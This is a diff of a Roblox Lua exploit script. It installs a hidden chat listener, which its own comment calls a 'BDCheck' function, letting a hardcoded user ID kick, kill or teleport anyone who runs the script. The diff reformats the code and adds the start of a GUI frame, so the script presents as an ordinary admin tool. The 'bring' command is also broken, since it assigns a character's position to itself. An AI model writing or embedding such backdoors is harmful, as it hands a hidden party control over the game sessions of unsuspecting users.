@@ -1,77 +1,104 @@
+
 -- one time executed
 if Executed then
-    return
+	return
 end
 
 getgenv().Executed = true
 
-local AdminPrefix = "!" 
+local AdminPrefix = "!" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer;
+local vis = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local PlayerGui = LocalP:WaitForChild("PlayerGui")
 getgenv().AdminTable = {
-  ["692194040"] = {["Access"] = 5}; 
+	["692194040"] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
 }
 
 getgenv().psearch = function(Name)
-  local Inserted = {}
-  for _, p in pairs(Players:GetPlayers()) do
-      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
-          table.insert(Inserted, p);return p
-      end
-  end
-end 
+	local Inserted = {}
+	for _, p in pairs(Players:GetPlayers()) do
+		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
+			table.insert(Inserted, p);return p
+		end
+	end
+end -- Simple player finder function
 
 getgenv().AdminCmdList = {
-  ["kick"] = {
-      ["CommandFunc"] = function(Player, self, CmdPlayer)
-          if Player == LocalP or Player == "all" then
-              LocalP:Kick(self)
-          end
-      end;
-      ["Clearence"] = {[5] = true;};
-  };
-  ["kill"] = {
-      ["CommandFunc"] = function(Player, self, CmdPlayer)
-          if Player == LocalP or Player == "all" then
-              LocalP.Character.Humanoid:ChangeState(15)
-          end
-      end;
-      ["Clearence"] = {[4] = true;[5] = true;};
-  };
-  ["bring"] = {
-      ["CommandFunc"] = function(Player, self, CmdPlayer)
-          if Player == LocalP or Player == "all" then
-                    local root = LocalP.Character:FindFirstChild("HumanoidRootPart") or LocalP.Character:FindFirstChild("Torso")
-                    if root then
-                        LocalP.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                    end
-          end
-      end;
-      ["Clearence"] = {[4] = true;[5] = true;};
-  };
+	["kick"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP:Kick(self)
+			end
+		end;
+		["Clearence"] = {[5] = true;};
+	}; -- you can make new ones of these (the ; have to be in the same spots)
+	["kill"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP.Character.Humanoid:ChangeState(15)
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["bring"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				local root = LocalP.Character:FindFirstChild("HumanoidRootPart") or LocalP.Character:FindFirstChild("Torso")
+				if root then
+					LocalP.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+				end
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
 };
 
 getgenv().BDCheck = function(Target2, Chat)
-  if Chat:sub(1, 1) == AdminPrefix then
-      local args = string.split(Chat:sub(2), " ")
-      local Command = AdminCmdList[table.remove(args, 1)]
-      local targ1 = psearch(table.remove(args, 1))
-      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
-          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
-      end
-  end
+	if Chat:sub(1, 1) == AdminPrefix then
+		local args = string.split(Chat:sub(2), " ")
+		local Command = AdminCmdList[table.remove(args, 1)]
+		local targ1 = psearch(table.remove(args, 1))
+		if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
+			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+		end
+	end
 end
 
 local GP = Players:GetPlayers()
 for i = 1, #GP do
-  local CoolKidPlayer = GP[i]
-  CoolKidPlayer.Chatted:Connect(function(Word)
-      BDCheck(CoolKidPlayer, Word)
-  end)
+	local CoolKidPlayer = GP[i]
+	CoolKidPlayer.Chatted:Connect(function(Word)
+		BDCheck(CoolKidPlayer, Word)
+	end)
 end 
 -- Checks if you chatted a command
 Players.PlayerAdded:Connect(function(CKP)
-  CKP.Chatted:Connect(function(Message)
-      BDCheck(CKP, Message)
-  end)
+	CKP.Chatted:Connect(function(Message)
+		BDCheck(CKP, Message)
+	end)
 end)
+
+vis.Name = "vis"
+vis.Parent = PlayerGui
+vis.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = vis
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Frame.BackgroundTransparency = 0.050
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.450375676, 0, 0.430987865, 0)
+Frame.Size = UDim2.new(0, 325, 0, 410)
+Frame.Draggable = true
+Frame.Active = true
+
+Frame_2.Parent = Frame
+Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame_2.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+Frame_2.BackgroundTransparency = 0.300
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame_2.Size = UDim2.new(0, 315, 0, 400)
